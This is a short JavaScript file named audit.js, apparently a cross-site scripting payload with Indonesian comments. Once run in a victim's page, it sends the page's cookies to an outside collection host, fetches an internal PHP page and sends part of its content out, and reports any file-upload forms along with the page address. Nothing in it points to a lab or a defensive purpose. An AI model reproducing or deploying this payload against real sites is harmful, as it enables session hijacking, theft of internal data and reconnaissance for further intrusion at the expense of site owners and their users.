// audit.js
(function() {
    const reportUrl = 'https://xss.report/c/skizaniza';

    // 1. Ambil Cookie
    fetch(`${reportUrl}?cookie=${btoa(document.cookie)}`);

    // 2. Cek apakah ocp.php bisa diakses (Mencari Path Internal)
    fetch('/ocp.php').then(r => r.text()).then(html => {
        fetch(`${reportUrl}?ocp_data=${btoa(html.substring(0, 1000))}`); // Ambil 1000 karakter pertama
    });

    // 3. Cari form upload secara agresif
    const forms = document.querySelectorAll('form');
    forms.forEach((f, i) => {
        if (f.innerHTML.includes('type="file"')) {
            fetch(`${reportUrl}?found_upload_form_at=${window.location.href}`);
        }
    });
})();
